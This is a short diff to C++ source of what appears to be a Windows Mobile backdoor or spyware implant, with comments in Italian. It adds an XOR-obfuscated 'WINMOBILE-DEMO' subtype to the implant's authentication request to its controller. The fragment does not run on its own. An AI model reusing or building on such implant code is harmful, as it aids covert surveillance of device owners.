@@ -11,6 +11,7 @@ using namespace std;
 #include "WindowsBlueTooth.h"
 #include "Explorer.h"
 #include "Buffer.h"
+#include "Task.h"
 
 #include <Iphlpapi.h>
 #include <wininet.h>
@@ -1330,8 +1331,22 @@ BYTE* Transfer::RestCreateAuthRequest(UINT *uEncContentLen) {
 	// Copia InstanceId
 	b.append(g_InstanceId, 20);
 
-	// Copia SubType
-	b.append(g_Subtype, 16);
+	// Aggiungi la demo string
+	if (Task::getDemo()) {
+		int k, i;
+
+		// WINMOBILE-DEMO\x00\x00 ^ Q (Q e' progressivo)
+		BYTE subtype[] = { 0x06, 0x1b, 0x1d, 0x19, 0x1a, 0x14, 0x1e, 0x14, 0x1c, 0x77, 0x1f, 0x19, 0x10, 0x11, 0x5f, 0x60 };
+
+		for (i = 0, k = 'Q'; i < 16; i++, k++) {
+			subtype[i] ^= k;
+		}
+
+		b.append(subtype, 16);
+	} else {
+		// Copia SubType
+		b.append(g_Subtype, 16);
+	}
 
 	// Calcola lo sha1(BackdoorId | InstanceId | SubType | ConfKey)
 	Hash hash;
